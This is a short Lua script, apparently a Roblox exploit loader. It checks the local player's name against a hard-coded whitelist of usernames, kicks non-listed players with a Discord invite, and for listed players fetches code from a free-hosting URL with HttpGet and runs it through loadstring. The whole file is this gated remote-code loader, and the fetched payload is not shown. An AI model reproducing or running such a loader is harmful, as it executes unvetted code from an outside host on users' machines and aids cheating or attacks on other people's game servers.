local Info = {}
 
Info.Whitelist = {
    ["atlas_IsSimpAndNoob"] = true,
    ["NotXcell"] = true,
    ["getrect0740"] = true,
    ["identityfiv"] = true,
    ["chafewerty2563"] = true,
    ["QulZed"] = true,
    ["MaddiesBalloon"] = true,
    ["s_pinter"] = true,
    ["Dominatorwashere"] = true,
    ["apoctio"] = true,
    ["MeganMorris4"] = true,
    ["HelloItsValky"] = true,
    ["Colxinn"] = true,
}
 
function Info:AdminP(player)
    if Info.Whitelist[player.name]  then
        return true
    else
        return false
    end
end
 
local player = game.Players.LocalPlayer
 
if Info:AdminP(player) then
    loadstring(game:HttpGet("https://puuror1.000webhostapp.com/fasfwasfeasd"))()
else
    player:Kick("https://discord.gg/FcJ7ZVPXDt")
end
